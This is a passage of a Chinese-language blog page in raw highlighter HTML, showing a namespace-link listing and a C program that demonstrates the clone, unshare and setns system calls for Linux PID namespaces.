class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mnt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mnt</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531840</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e20764303085-6\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">net</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531963</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e20764303085-7\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pid</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531836</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e20764303085-8\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">user</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">user</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531837</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e20764303085-9\"><span class=\"crayon-i\">lrwxrwxrwx</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">kelvin </span><span class=\"crayon-i\">kelvin</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span>月<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uts</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uts</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">4026531838</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<p>下面的代码演示了如何利用上述3个系统调用来操作进程的命名空间：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e2e512702780\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#define _GNU_SOURCE\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;sys/wait.h&gt;\r\n#include &lt;sched.h&gt;\r\n#include &lt;signal.h&gt;\r\n#include &lt;unistd.h&gt;\r\n#include &lt;stdio.h&gt;\r\n#include &lt;string.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;errno.h&gt;\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;sys/stat.h&gt;\r\n#include &lt;fcntl.h&gt;\r\n\r\n#define STACK_SIZE (10 * 1024 * 1024)\r\n\r\nchar child_stack[STACK_SIZE];\r\n\r\nint child_main(void* args) {\r\n    pid_t child_pid = getpid();\r\n    printf(\"I'm child process and my pid is %d \\n\", child_pid);\r\n    // 子进程会被放到clone系统调用新创建的pid命名空间中, 所以其pid应该为1\r\n    sleep(300);\r\n    // 命名空间中的所有进程退出后该命名空间的inode将会被删除, 为后续操作保留它\r\n    return 0;\r\n}\r\n\r\nint main() {\r\n    /* Clone */\r\n    pid_t child_pid = clone(child_main, child_stack + STACK_SIZE, \\\r\n        CLONE_NEWPID | SIGCHLD, NULL);\r\n    if(child_pid &lt; 0) {\r\n        perror(\"clone failed\");\r\n    }\r\n\r\n    /* Unshare */\r\n    int ret = unshare(CLONE_NEWPID); // 父进程调用unshare, 创建了一个新的命名空间,\r\n    //但不会创建子进程. 之后再创建的子进程将会被加入到新的命名空间中\r\n    if (ret &lt; 0) {\r\n        perror(\"unshare failed\");\r\n    }\r\n    int fpid = fork();\r\n    if (fpid &lt; 0) {\r\n        perror(\"fork error\");\r\n    } else if (fpid == 0) {\r\n        printf(\"I am child process. My pid is %d  \\n\", getpid());\r\n        // Fork后的子进程会被加入到unshare创建的命名空间中, 所以pid应该为1\r\n        exit(0);\r\n    } else {\r\n    }\r\n    waitpid(fpid, NULL, 0);\r\n\r\n    /* Setns */\r\n    char path[80] = \"\";\r\n    sprintf(path, \"/proc/%d/ns/pid\", child_pid);\r\n    int fd = open(path, O_RDONLY);\r\n    if (fd == -1)\r\n        perror(\"open error\");\r\n    if (setns(fd, 0) == -1)\r\n    // setns并不会改变当前进程的命名空间, 而是会设置之后创建的子进程的命名空间\r\n        perror(\"setns error\");\r\n    close(fd);\r\n\r\n    int npid = fork();\r\n    if (npid &lt; 0) {\r\n        perror(\"fork error\");\r\n    } else if (npid == 0) {\r\n        printf(\"I am child process. My pid is %d  \\n\", getpid());\r\n        // 新的子进程会被加入到第一个子进程的pid命名空间中, 所以其pid应该为2\r\n        exit(0);\r\n    } else {\r\n    }\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e2e512702780-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e2e512702780-74\">74</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-1\"><span class=\"crayon-p\">#define _GNU_SOURCE</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-2\"><span class=\"crayon-p\">#include &lt;sys/types.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-3\"><span class=\"crayon-p\">#include &lt;sys/wait.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-4\"><span class=\"crayon-p\">#include &lt;sched.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-5\"><span class=\"crayon-p\">#include &lt;signal.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-6\"><span class=\"crayon-p\">#include &lt;unistd.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-7\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-8\"><span class=\"crayon-p\">#include &lt;string.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-9\"><span class=\"crayon-p\">#include &lt;stdlib.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-10\"><span class=\"crayon-p\">#include &lt;errno.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-11\"><span class=\"crayon-p\">#include &lt;sys/types.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-12\"><span class=\"crayon-p\">#include &lt;sys/stat.h&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-13\"><span class=\"crayon-p\">#include &lt;fcntl.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-15\"><span class=\"crayon-p\">#define STACK_SIZE (10 * 1024 * 1024)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-17\"><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">child_stack</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">STACK_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-19\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">child_main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">pid_t </span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getpid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"I'm child process and my pid is %d \\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 子进程会被放到clone系统调用新创建的pid命名空间中, 所以其pid应该为1</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">300</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 命名空间中的所有进程退出后该命名空间的inode将会被删除, 为后续操作保留它</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-26\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-28\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Clone */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">pid_t </span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">clone</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">child_main</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">child_stack</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">STACK_SIZE</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">CLONE_NEWPID</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SIGCHLD</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"clone failed\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-35\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-36\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Unshare */</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ret</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">unshare</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">CLONE_NEWPID</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 父进程调用unshare, 创建了一个新的命名空间,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">//但不会创建子进程. 之后再创建的子进程将会被加入到新的命名空间中</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ret</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"unshare failed\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fork</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-44\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"fork error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-46\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"I am child process. My pid is %d  \\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getpid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-47\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// Fork后的子进程会被加入到unshare创建的命名空间中, 所以pid应该为1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">exit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e2e512702780-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e2e512702780-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">waitpid</span><span 